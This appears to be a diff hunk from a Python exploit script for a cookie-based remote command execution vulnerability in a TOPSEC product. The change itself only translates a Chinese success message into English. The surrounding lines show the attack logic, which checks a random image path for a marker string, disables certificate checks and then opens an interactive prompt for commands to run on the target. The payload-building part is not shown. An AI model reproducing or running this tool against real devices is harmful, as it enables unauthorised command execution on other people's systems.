@@ -26,7 +26,7 @@ def run(url):
             result_url = urljoin(url, "/site/image/{}".format(random_string))
             command_response = requests.get(result_url, headers=headers, verify=False, proxies=proxies)
             if command_response.status_code == 200 and "Klmiuhgs" in command_response.text:
-                print("\033[31mfound: TOPSEC-product Cookie 远程命令执行漏洞!:\033[0m")
+                print("\033[31mDiscovered: TOPSEC-product Cookie Remote Command Execution Vulnerability!:\033[0m")
                 result_url = urljoin(url, "/site/image/{}".format(random_string))
                 while True:
                     command = input("\033[34mPlease input command (stop input:exit):\033[0m")
